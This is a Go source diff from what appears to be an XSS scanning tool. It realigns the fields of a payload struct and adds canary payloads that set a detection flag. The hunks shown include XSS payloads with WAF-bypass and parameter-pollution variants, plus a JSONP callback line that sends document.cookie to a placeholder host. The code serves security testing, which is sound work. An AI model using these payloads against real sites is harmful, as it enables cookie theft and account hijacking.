@@ -13,23 +13,23 @@ import (
 type Context string
 
 const (
-	ContextHTML      Context = "html"       // Inside HTML body
-	ContextAttr      Context = "attr"       // Inside HTML attribute
-	ContextJS        Context = "js"         // Inside JavaScript string
-	ContextURL       Context = "url"        // Inside URL parameter
-	ContextCSS       Context = "css"        // Inside CSS
-	ContextJSVar     Context = "jsvar"      // JavaScript variable assignment
-	ContextTemplate  Context = "template"   // Template literal
+	ContextHTML     Context = "html"     // Inside HTML body
+	ContextAttr     Context = "attr"     // Inside HTML attribute
+	ContextJS       Context = "js"       // Inside JavaScript string
+	ContextURL      Context = "url"      // Inside URL parameter
+	ContextCSS      Context = "css"      // Inside CSS
+	ContextJSVar    Context = "jsvar"    // JavaScript variable assignment
+	ContextTemplate Context = "template" // Template literal
 )
 
 // Payload represents a test payload with metadata
 type Payload struct {
-	Value      string
-	Context    Context
-	Tag        string   // Tags: "basic", "img", "svg", "event", "encode", "waf-bypass"
-	WAF        string   // Target WAF: "generic", "cloudflare", "aws", "modsec", ""
-	Encoding   string   // Encoding: "none", "url", "html-entity", "unicode", "base64"
-	Dangerous  bool     // true if payload sends data to external servers
+	Value     string
+	Context   Context
+	Tag       string // Tags: "basic", "img", "svg", "event", "encode", "waf-bypass"
+	WAF       string // Target WAF: "generic", "cloudflare", "aws", "modsec", ""
+	Encoding  string // Encoding: "none", "url", "html-entity", "unicode", "base64"
+	Dangerous bool   // true if payload sends data to external servers
 }
 
 // GetBasePayloads returns core XSS payloads organized by context
@@ -348,8 +348,8 @@ func GetWafBypassPayloads() []Payload {
 		`?q=<script>alert(1)&q=</script>`,
 		`?q=<img/src=x/onerror=alert(1)>&q=safe`,
 		// Separator injection
-		`?q=legit%26q=<script>alert(1)</script>`,  // & in value
-		`?q=legit%3Bq=<script>alert(1)</script>`,  // ; in value
+		`?q=legit%26q=<script>alert(1)</script>`, // & in value
+		`?q=legit%3Bq=<script>alert(1)</script>`, // ; in value
 		// Fragment-based
 		`?q=test#<script>alert(1)</script>`,
 		// Array-style parameter
@@ -370,7 +370,7 @@ func GetWafBypassPayloads() []Payload {
 		`callback=alert&_=1`,
 		`cb=function(){alert(1)}()`,
 		`callback=document.location='http://YOUR_DOMAIN.example/?c='+document.cookie`,
-		`%61%6c%65%72%74(1)`,  // encoded callback name
+		`%61%6c%65%72%74(1)`, // encoded callback name
 		`callback=window["al"+"ert"](1)`,
 	}
 
@@ -633,13 +633,23 @@ func GetWafBypassPayloads() []Payload {
 
 // GetCanaryPayloads returns payloads with a canary for detection
 func GetCanaryPayloads(canary string) []Payload {
+	jsMarker := "window.xssTriggered=true/*" + canary + "*/"
 	payloads := []Payload{
 		{Value: canary, Context: ContextHTML, Tag: "canary"},
 		{Value: fmt.Sprintf(`<img src=x onerror="window.xssTriggered=true">%s`, canary), Context: ContextHTML, Tag: "canary"},
 		{Value: fmt.Sprintf(`"><script>window.xssTriggered=true</script>%s`, canary), Context: ContextAttr, Tag: "canary"},
 		{Value: fmt.Sprintf(`"><svg/onload=window.xssTriggered=true>%s`, canary), Context: ContextAttr, Tag: "canary"},
-		{Value: fmt.Sprintf(`'-window.xssTriggered=true-'%s`, canary), Context: ContextJS, Tag: "canary"},
+		{Value: fmt.Sprintf(`'-(window.xssTriggered=true/*%s*/)-'`, canary), Context: ContextJS, Tag: "canary"},
+		{Value: fmt.Sprintf(`";window.xssTriggered=true/*%s*/;var x="`, canary), Context: ContextJS, Tag: "canary"},
+		{Value: fmt.Sprintf(`\";window.xssTriggered=true/*%s*/;var x=\"`, canary), Context: ContextJS, Tag: "canary"},
+		{Value: fmt.Sprintf(`</script><script>window.xssTriggered=true/*%s*/</script>`, canary), Context: ContextJS, Tag: "canary"},
 		{Value: fmt.Sprintf(`${window.xssTriggered=true}%s`, canary), Context: ContextTemplate, Tag: "canary"},
+		{Value: fmt.Sprintf(`x" autofocus onfocus="%s`, jsMarker), Context: ContextAttr, Tag: "canary"},
+		{Value: fmt.Sprintf(`x" onmouseover="%s" x="`, jsMarker), Context: ContextAttr, Tag: "canary"},
+		{Value: fmt.Sprintf(`x" onerror="%s`, jsMarker), Context: ContextAttr, Tag: "canary"},
+		{Value: fmt.Sprintf(`javascript:%s`, jsMarker), Context: ContextURL, Tag: "canary"},
+		{Value: fmt.Sprintf(`<a href=javascript:%s>x</a>`, jsMarker), Context: ContextHTML, Tag: "canary"},
+		{Value: `<svg/onload=xssTriggered=!0>`, Context: ContextHTML, Tag: "canary-compact"},
 	}
 	return payloads
 }
